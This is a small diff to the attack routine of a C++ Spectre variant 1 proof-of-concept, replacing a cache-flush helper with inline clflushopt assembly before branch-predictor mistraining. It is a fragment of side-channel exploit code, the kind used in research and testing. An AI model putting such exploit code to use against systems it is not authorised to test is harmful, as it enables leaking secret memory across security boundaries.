@@ -35,10 +35,10 @@ volatile void Spectrev1::read_byte( void volatile * const p_secret, uint8_t *p_v
 
 inline void Spectrev1::do_attack(size_t train_x, size_t mal_x)
 {
-    // Flush every cache line in p_scratchpad
+    // Fast Flush every cache line in p_scratchpad
     for (volatile auto i = 0; i < MAX_BYTE*block_len; i += cachelinesize)
     {
-        flush(&p_scratchpad[i]);
+        asm volatile("clflushopt (%0);" :: "R"(&p_scratchpad[i]));
     }
 
     mistrain(train_x, mal_x);
